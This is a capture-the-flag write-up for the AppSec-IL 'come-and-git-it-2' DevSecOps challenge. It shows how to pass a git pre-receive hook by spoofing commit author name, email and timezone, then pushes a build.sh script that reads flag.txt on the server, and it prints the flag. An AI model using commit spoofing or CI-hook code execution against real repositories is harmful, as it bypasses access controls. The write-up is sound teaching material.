# come-and-git-it-2
* Category: DevSecOps
* 350 Points
* Solved by the JCTF Team

## Description
> 
> 
> 1. Add the attached ssh key to your ssh-agent. [Here's some documentation](https://docs.github.com/en/free-pro-team@latest/github/authenticating-to-github/generating-a-new-ssh-key-and-adding-it-to-the-ssh-agent#adding-your-ssh-key-to-the-ssh-agent), but TL;DR:
> 
>     ```
>     eval $(ssh-agent -s)
>     ssh-add ~/path_to_key/id_rsa.player
>     ```
> 
> 2. `git clone ssh://gamemaster@come-and-git-it.appsecil.ctf.today:2222/~/ctf-repo`
> 
> 3. `cd ctf-repo`
> 
> 4. `git checkout aghastness-subhead-cyrtometer`
> 
> 5. ???
> 
> 6. PROFIT!!!

Attached was a private RSA key.

## Solution

This is the follow-up for [come-and-git-it-1](come-and-git-it-1.md).

After setting up the workspace (like before, just a different branch), we get:

```console
root@kali:/media/sf_CTFs/appsec/come-and-git-it-2/ctf-repo# ls -al
total 45
drwxrwx--- 1 root vboxsf  4096 Oct 27 00:05 .
drwxrwx--- 1 root vboxsf  4096 Oct 27 00:04 ..
-rwxrwx--- 1 root vboxsf  2763 Oct 27 00:05 ABoyNamedSue.md
drwxrwx--- 1 root vboxsf     0 Oct 27 00:05 .build
drwxrwx--- 1 root vboxsf  4096 Oct 27 00:05 .git
-rwxrwx--- 1 root vboxsf 18658 Oct 27 00:04 LICENSE
-rwxrwx--- 1 root vboxsf   964 Oct 27 00:05 OnTheRoadAgain.md
-rwxrwx--- 1 root vboxsf   422 Oct 27 00:05 README.md
-rwxrwx--- 1 root vboxsf   860 Oct 27 00:05 SouthernNights.md
```

Let's check the README:
```console
root@kali:/media/sf_CTFs/appsec/come-and-git-it-2/ctf-repo# cat README.md
# Welcome to make-git-better

_____  _    _  ___   ___________
|  _  || |  | |/ _ \ /  ___| ___ \
| | | || |  | / /_\ \\ `--.| |_/ /
| | | || |/\| |  _  | `--. \  __/
\ \_/ /\  /\  / | | |/\__/ / |
 \___/  \/  \/\_| |_/\____/\_|

Welcome to the awesome build system! Each push, the awesome build system will build.

Very secure. (☞°ヮ°)☞ ☜(°ヮ°☜)
Very very secure. (＾ω＾)人(＾ω＾)
```

So let's push:

```console
root@kali:/media/sf_CTFs/appsec/come-and-git-it-2/ctf-repo# touch dummy.txt
root@kali:/media/sf_CTFs/appsec/come-and-git-it-2/ctf-repo# git config user.email "fake@mail.com"
root@kali:/media/sf_CTFs/appsec/come-and-git-it-2/ctf-repo# git config user.name "Fake Name"
root@kali:/media/sf_CTFs/appsec/come-and-git-it-2/ctf-repo# touch dummy.txt
root@kali:/media/sf_CTFs/appsec/come-and-git-it-2/ctf-repo# git add dummy.txt
root@kali:/media/sf_CTFs/appsec/come-and-git-it-2/ctf-repo# git commit -m "Each push, the awesome build system will build"
[aghastness-subhead-cyrtometer 8183e08] Each push, the awesome build system will build
 1 file changed, 0 insertions(+), 0 deletions(-)
 create mode 100644 dummy.txt
root@kali:/media/sf_CTFs/appsec/come-and-git-it-2/ctf-repo# git push
Enumerating objects: 4, done.
Counting objects: 100% (4/4), done.
Compressing objects: 100% (2/2), done.
Writing objects: 100% (3/3), 293 bytes | 15.00 KiB/s, done.
Total 3 (delta 1), reused 1 (delta 0)
remote:
remote: -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-
remote:
remote: Pushed a branch: aghastness-subhead-cyrtometer
remote:
remote: Welcome to the awesome build system.
remote:
remote:  -=- Legend -=-
remote: [BUILD STEP] [STATUS] {message from build system}
remote: [n] [-]     Step n is 'in progress'.
remote: [n] [V]     Step n passed, will continue to next step.
remote: [n] [X]     Step n failed, will exit the build.
remote:
remote: [0] [-] Initializing build system...
remote: [0] [V] Build system initialized.
remote: [0] [V]     #0 passed! (* ^ ω ^)
remote: [1] [-] Checking authorization by name...
remote: [1] [-] Found name: Fake Name
remote: [1] [X] Authorization failed! Non-authorized commit author name.
remote: [1] [X] (╮°-°)╮┳━━┳ ( ╯°□°)╯ ┻━━┻
To ssh://come-and-git-it.appsecil.ctf.today:2222/~/ctf-repo
 ! [remote rejected] aghastness-subhead-cyrtometer -> aghastness-subhead-cyrtometer (pre-receive hook declined)
error: failed to push some refs to 'ssh://gamemaster@come-and-git-it.appsecil.ctf.today:2222/~/ctf-repo'
```

The push failed due to an error: "Authorization failed! Non-authorized commit author name".

What are the authorized names? The git history will give us a clue:

```console
root@kali:/media/sf_CTFs/appsec/come-and-git-it-2/ctf-repo# git log
commit 8183e08f8ab6c1bbf41be15f052c69c4d148e362 (HEAD -> aghastness-subhead-cyrtometer)
Author: Fake Name <fake@mail.com>
Date:   Tue Oct 27 00:07:21 2020 +0200

    Each push, the awesome build system will build

commit 1477eed74cb7e5d7180c259157e3ba08e912bda1 (tag: aghastness-subhead-cyrtometer-tag, origin/aghastness-subhead-cyrtometer)
Author: Willie Nelson <WillieNelson@build.system>
Date:   Mon Oct 19 20:19:19 2020 -1200

    Moved AUTHORS (of the build system) to the secret hidden build folder.

commit ba2aed7b4db5fda318937e1fdd993f4dcb362973
Author: Willie Nelson <WillieNelson@build.system>
Date:   Mon Oct 19 20:19:19 2020 -1200

    I cant wait to get on the road again

commit 9ff403f8fa7b51d64df088ec5149ca141667ec4b
Author: Glen Campbell <GlenCampbell@build.system>
Date:   Mon Oct 19 20:19:19 2020 -1200

    Feel So Good It's Frightening

commit 155431e369707a422c76ec078c4f0433a8679bfa
Author: Johnny Cash <JohnnyCash@build.system>
Date:   Tue Oct 20 02:03:24 2020 +0300

    A boy named sue

commit 189e8c7c2c26844df19cf3b2af71f8f3914eb439
Author: Johnny Cash <JohnnyCash@build.system>
Date:   Mon Oct 19 20:19:19 2020 -1200

    Added readme and authors.

commit 2699bcbe555a65732fa0f7619455a952a5a33ea3 (origin/master, origin/HEAD, master)
Author: Shay Nehmad <shay.nehmad@guardicore.com>
Date:   Fri May 29 12:14:16 2020 +0300

    Added some content to the readme to make it look better.

commit 088af4ec974ee7fc1f4742c50bd6b68b66f9ac6d
Author: Shay Nehmad <shay.nehmad@guardicore.com>
Date:   Tue May 12 20:35:36 2020 +0300

    Added initial README file

commit e3be94525dff4481367486c5c0a5d39298d48425
Author: Shay Nehmad <shay.nehmad@guardicore.com>
Date:   Tue May 12 20:32:14 2020 +0300

    Added license file

commit 86124cccc6cf34cfcee157ca4d42f9563f3cdf63
Author: Shay Nehmad <48879847+ShayNehmad@users.noreply.github.com>
Date:   Tue May 12 20:30:54 2020 +0300

    Initial commit
```

According to the comment ("Moved AUTHORS (of the build system) to the secret hidden build folder") we should look in the hidden build folder:

```console
root@kali:/media/sf_CTFs/appsec/come-and-git-it-2/ctf-repo# ls -al .build/
total 5
drwxrwx--- 1 root vboxsf    0 Oct 27 00:05 .
drwxrwx--- 1 root vboxsf 4096 Oct 27 00:06 ..
-rwxrwx--- 1 root vboxsf  171 Oct 27 00:05 AUTHORS.md
root@kali:/media/sf_CTFs/appsec/come-and-git-it-2/ctf-repo# cat .build/AUTHORS.md
The awesome build system was written by:

- Johnny Cash (johnnycash@build.system)
- Glen Campbell (glencampbell@build.system)
- Willie Nelson (willienelson@build.system)
```

So, we should reconfigure our name and try again:

```console
root@kali:/media/sf_CTFs/appsec/come-and-git-it-2/ctf-repo# git config user.name "Johnny Cash"
root@kali:/media/sf_CTFs/appsec/come-and-git-it-2/ctf-repo# echo a > dummy.txt
root@kali:/media/sf_CTFs/appsec/come-and-git-it-2/ctf-repo# git add dummy.txt
root@kali:/media/sf_CTFs/appsec/come-and-git-it-2/ctf-repo# git commit -m "Attempt #2"
[aghastness-subhead-cyrtometer 7e4a8e9] Attempt #2
 1 file changed, 1 insertion(+)
root@kali:/media/sf_CTFs/appsec/come-and-git-it-2/ctf-repo# git push
Enumerating objects: 7, done.
Counting objects: 100% (7/7), done.
Compressing objects: 100% (4/4), done.
Writing objects: 100% (6/6), 494 bytes | 19.00 KiB/s, done.
Total 6 (delta 2), reused 1 (delta 0)
remote:
remote: -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-
remote:
remote: Pushed a branch: aghastness-subhead-cyrtometer
remote:
remote: Welcome to the awesome build system.
remote:
remote:  -=- Legend -=-
remote: [BUILD STEP] [STATUS] {message from build system}
remote: [n] [-]     Step n is 'in progress'.
remote: [n] [V]     Step n passed, will continue to next step.
remote: [n] [X]     Step n failed, will exit the build.
remote:
remote: [0] [-] Initializing build system...
remote: [0] [V] Build system initialized.
remote: [0] [V]     #0 passed! (* ^ ω ^)
remote: [1] [-] Checking authorization by name...
remote: [1] [-] Found name: Johnny Cash
remote: [1] [V] Authorization by name passed.
remote: [1] [V]     #1 passed! (* ^ ω ^)
remote: [2] [-] Checking authorization by email...
remote: [2] [-] Found email: fake@mail.com
remote: [2] [X] Authorization failed! Non-authorized commit author email.
remote: [2] [X] (╮°-°)╮┳━━┳ ( ╯°□°)╯ ┻━━┻
To ssh://come-and-git-it.appsecil.ctf.today:2222/~/ctf-repo
 ! [remote rejected] aghastness-subhead-cyrtometer -> aghastness-subhead-cyrtometer (pre-receive hook declined)
error: failed to push some refs to 'ssh://gamemaster@come-and-git-it.appsecil.ctf.today:2222/~/ctf-repo'
```

Now the email is unauthorized. Well, we can't say we didn't see that coming.

So, we reconfigure the mail via `git config user.email "johnnycash@build.system"` and try again:

```
root@kali:/media/sf_CTFs/appsec/come-and-git-it-2/ctf-repo# git push
Enumerating objects: 10, done.
Counting objects: 100% (10/10), done.
Compressing objects: 100% (6/6), done.
Writing objects: 100% (9/9), 704 bytes | 20.00 KiB/s, done.
Total 9 (delta 3), reused 1 (delta 0)
remote:
remote: -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-
remote:
remote: Pushed a branch: aghastness-subhead-cyrtometer
remote:
remote: Welcome to the awesome build system.
remote:
remote:  -=- Legend -=-
remote: [BUILD STEP] [STATUS] {message from build system}
remote: [n] [-]     Step n is 'in progress'.
remote: [n] [V]     Step n passed, will continue to next step.
remote: [n] [X]     Step n failed, will exit the build.
remote:
remote: [0] [-] Initializing build system...
remote: [0] [V] Build system initialized.
remote: [0] [V]     #0 passed! (* ^ ω ^)
remote: [1] [-] Checking authorization by name...
remote: [1] [-] Found name: Johnny Cash
remote: [1] [V] Authorization by name passed.
remote: [1] [V]     #1 passed! (* ^ ω ^)
remote: [2] [-] Checking authorization by email...
remote: [2] [-] Found email: johnnycash@build.system
remote: [2] [V] Authorization by email passed.
remote: [2] [V]     #2 passed! (* ^ ω ^)
remote: [3] [-] Checking authorized geolocation...
remote: [3] [-] Found timezone: +0200
remote: [3] [X] Geolocation auth failed! Non-authorized timezone. Please travel to Baker Island, Howland Island or anywhere within the IDLW, set your clock, and commit from there. Make sure to pack enough food, drink and other supplies for the journey.
remote: [3] [X] (╮°-°)╮┳━━┳ ( ╯°□°)╯ ┻━━┻
To ssh://come-and-git-it.appsecil.ctf.today:2222/~/ctf-repo
 ! [remote rejected] aghastness-subhead-cyrtometer -> aghastness-subhead-cyrtometer (pre-receive hook declined)
error: failed to push some refs to 'ssh://gamemaster@come-and-git-it.appsecil.ctf.today:2222/~/ctf-repo'
```

So now the timezone isn't good enough. We need to have a commit with the timezone of Baker Island, which is GMT-12:00. Fortunately, we can easily fake that:

```console
root@kali:/media/sf_CTFs/appsec/come-and-git-it-2/ctf-repo# echo c > dummy.txt
root@kali:/media/sf_CTFs/appsec/come-and-git-it-2/ctf-repo# git add dummy.txt
root@kali:/media/sf_CTFs/appsec/come-and-git-it-2/ctf-repo# git commit -m "Fake timezone" --date="$(date --utc +%Y-%m-%dT%H:%M:%S-1200)"
[aghastness-subhead-cyrtometer 1652466] Fake timezone
 Date: Mon Oct 26 22:14:47 2020 -1200
 1 file changed, 1 insertion(+), 1 deletion(-)
root@kali:/media/sf_CTFs/appsec/come-and-git-it-2/ctf-repo# git push
Enumerating objects: 13, done.
Counting objects: 100% (13/13), done.
Compressing objects: 100% (8/8), done.
Writing objects: 100% (12/12), 925 bytes | 18.00 KiB/s, done.
Total 12 (delta 4), reused 1 (delta 0)
remote:
remote: -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-
remote:
remote: Pushed a branch: aghastness-subhead-cyrtometer
remote:
remote: Welcome to the awesome build system.
remote:
remote:  -=- Legend -=-
remote: [BUILD STEP] [STATUS] {message from build system}
remote: [n] [-]     Step n is 'in progress'.
remote: [n] [V]     Step n passed, will continue to next step.
remote: [n] [X]     Step n failed, will exit the build.
remote:
remote: [0] [-] Initializing build system...
remote: [0] [V] Build system initialized.
remote: [0] [V]     #0 passed! (* ^ ω ^)
remote: [1] [-] Checking authorization by name...
remote: [1] [-] Found name: Johnny Cash
remote: [1] [V] Authorization by name passed.
remote: [1] [V]     #1 passed! (* ^ ω ^)
remote: [2] [-] Checking authorization by email...
remote: [2] [-] Found email: johnnycash@build.system
remote: [2] [V] Authorization by email passed.
remote: [2] [V]     #2 passed! (* ^ ω ^)
remote: [3] [-] Checking authorized geolocation...
remote: [3] [-] Found timezone: -1200
remote: [3] [V] Authorization by timezone passed.
remote: [3] [V]     #3 passed! (* ^ ω ^)
remote: [4] [-] Creating temporary build directory for build resources...
remote: [4] [V] Created temporary directory for build resources in /tmp/tmp.phLMEtUoUd which can be accessed via an environment variable.
remote: [4] [V]     #4 passed! (* ^ ω ^)
remote: [5] [-] Copying build resources to temporary build directory...
remote: '/flag.txt' -> '/tmp/tmp.phLMEtUoUd/flag.txt'
remote: changed ownership of '/tmp/tmp.phLMEtUoUd/flag.txt' from flagger_the_second:flagger_the_second to build_system:build_system
remote: [5] [V] Copied and chmod-ed build resources.
remote: [5] [V]     #5 passed! (* ^ ω ^)
remote: [6] [-] Locating build script in .build/build.sh...
remote: [6] [X] .build/build.sh not found!
remote: [6] [X] (╮°-°)╮┳━━┳ ( ╯°□°)╯ ┻━━┻
To ssh://come-and-git-it.appsecil.ctf.today:2222/~/ctf-repo
 ! [remote rejected] aghastness-subhead-cyrtometer -> aghastness-subhead-cyrtometer (pre-receive hook declined)
error: failed to push some refs to 'ssh://gamemaster@come-and-git-it.appsecil.ctf.today:2222/~/ctf-repo'
```

We can see the hook moving the flag to the temporary folder:

```
remote: '/flag.txt' -> '/tmp/tmp.phLMEtUoUd/flag.txt'
remote: changed ownership of '/tmp/tmp.phLMEtUoUd/flag.txt' from flagger_the_second:flagger_the_second to build_system:build_system
```

Also, finally, we get to run some code. The hook wants to run `.build/build.sh`, so we'll give it just that:

```bash
#!/bin/bash

cat $(find /tmp -name "flag.txt" 2>/dev/null)
```

We push:
```console
root@kali:/media/sf_CTFs/appsec/come-and-git-it-2/ctf-repo# git add .build/build.sh
root@kali:/media/sf_CTFs/appsec/come-and-git-it-2/ctf-repo# git commit -m "Build.sh"  --date="$(date --utc +%Y-%m-%dT%H:%M:%S-1200)"
[aghastness-subhead-cyrtometer acfc5f8] Build.sh
 Date: Mon Oct 26 22:18:33 2020 -1200
 1 file changed, 3 insertions(+)
 create mode 100644 .build/build.sh
root@kali:/media/sf_CTFs/appsec/come-and-git-it-2/ctf-repo# git push
Enumerating objects: 18, done.
Counting objects: 100% (18/18), done.
Compressing objects: 100% (12/12), done.
Writing objects: 100% (16/16), 1.32 KiB | 25.00 KiB/s, done.
Total 16 (delta 5), reused 1 (delta 0)
remote:
remote: -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-
remote:
remote: Pushed a branch: aghastness-subhead-cyrtometer
remote:
remote: Welcome to the awesome build system.
remote:
remote:  -=- Legend -=-
remote: [BUILD STEP] [STATUS] {message from build system}
remote: [n] [-]     Step n is 'in progress'.
remote: [n] [V]     Step n passed, will continue to next step.
remote: [n] [X]     Step n failed, will exit the build.
remote:
remote: [0] [-] Initializing build system...
remote: [0] [V] Build system initialized.
remote: [0] [V]     #0 passed! (* ^ ω ^)
remote: [1] [-] Checking authorization by name...
remote: [1] [-] Found name: Johnny Cash
remote: [1] [V] Authorization by name passed.
remote: [1] [V]     #1 passed! (* ^ ω ^)
remote: [2] [-] Checking authorization by email...
remote: [2] [-] Found email: johnnycash@build.system
remote: [2] [V] Authorization by email passed.
remote: [2] [V]     #2 passed! (* ^ ω ^)
remote: [3] [-] Checking authorized geolocation...
remote: [3] [-] Found timezone: -1200
remote: [3] [V] Authorization by timezone passed.
remote: [3] [V]     #3 passed! (* ^ ω ^)
remote: [4] [-] Creating temporary build directory for build resources...
remote: [4] [V] Created temporary directory for build resources in /tmp/tmp.pAWhFXQWxR which can be accessed via an environment variable.
remote: [4] [V]     #4 passed! (* ^ ω ^)
remote: [5] [-] Copying build resources to temporary build directory...
remote: '/flag.txt' -> '/tmp/tmp.pAWhFXQWxR/flag.txt'
remote: changed ownership of '/tmp/tmp.pAWhFXQWxR/flag.txt' from flagger_the_second:flagger_the_second to build_system:build_system
remote: [5] [V] Copied and chmod-ed build resources.
remote: [5] [V]     #5 passed! (* ^ ω ^)
remote: [6] [-] Locating build script in .build/build.sh...
remote: [6] [V] Build script located!
remote: [6] [V]     #6 passed! (* ^ ω ^)
remote: [7] [-] Giving .build directory exec permissions...
remote: mode of '.build' changed from 0755 (rwxr-xr-x) to 0777 (rwxrwxrwx)
remote: mode of '.build/AUTHORS.md' changed from 0644 (rw-r--r--) to 0777 (rwxrwxrwx)
remote: mode of '.build/build.sh' changed from 0644 (rw-r--r--) to 0777 (rwxrwxrwx)
remote: [7] [V] .build directory chmod-ed
remote: [7] [V]     #7 passed! (* ^ ω ^)
remote: [8] [-] Running '.build/build.sh' using 'bash' as user 'build_system'
remote: "AppSec-IL{1f_y0u_w4n7_17_c0m3_4nd_917_17}"
remote: "AppSec-IL{1f_y0u_w4n7_17_c0m3_4nd_917_17}"
remote: "AppSec-IL{1f_y0u_w4n7_17_c0m3_4nd_917_17}"
remote: "AppSec-IL{1f_y0u_w4n7_17_c0m3_4nd_917_17}"
remote: "AppSec-IL{1f_y0u_w4n7_17_c0m3_4nd_917_17}"
remote: "AppSec-IL{1f_y0u_w4n7_17_c0m3_4nd_917_17}"
remote: "AppSec-IL{1f_y0u_w4n7_17_c0m3_4nd_917_17}"
remote: "AppSec-IL{1f_y0u_w4n7_17_c0m3_4nd_917_17}"
remote: "AppSec-IL{1f_y0u_w4n7_17_c0m3_4nd_917_17}"
remote: "AppSec-IL{1f_y0u_w4n7_17_c0m3_4nd_917_17}"
remote: "AppSec-IL{1f_y0u_w4n7_17_c0m3_4nd_917_17}"
remote: "AppSec-IL{1f_y0u_w4n7_17_c0m3_4nd_917_17}"
remote: "AppSec-IL{1f_y0u_w4n7_17_c0m3_4nd_917_17}"
remote: "AppSec-IL{1f_y0u_w4n7_17_c0m3_4nd_917_17}"
remote: "AppSec-IL{1f_y0u_w4n7_17_c0m3_4nd_917_17}"
remote: "AppSec-IL{1f_y0u_w4n7_17_c0m3_4nd_917_17}"
remote: [8] [V] Done running build script.
remote: [8] [V]     #8 passed! (* ^ ω ^)
remote: [9] [-] Deleting temporary build directory...
remote: removed '/tmp/tmp.pAWhFXQWxR/flag.txt'
remote: removed directory '/tmp/tmp.pAWhFXQWxR'
remote: [9] [V] Deleted temporary build directory.
remote: [9] [V]     #9 passed! (* ^ ω ^)
remote: [10] [-] Deploying output to @build.system cloud...
remote: [10] [X] @build.system cloud doesn't exist yet. Exiting build.
remote: [10] [X] (╮°-°)╮┳━━┳ ( ╯°□°)╯ ┻━━┻
To ssh://come-and-git-it.appsecil.ctf.today:2222/~/ctf-repo
 ! [remote rejected] aghastness-subhead-cyrtometer -> aghastness-subhead-cyrtometer (pre-receive hook declined)
error: failed to push some refs to 'ssh://gamemaster@come-and-git-it.appsecil.ctf.today:2222/~/ctf-repo'
```

The flag: `AppSec-IL{1f_y0u_w4n7_17_c0m3_4nd_917_17}`
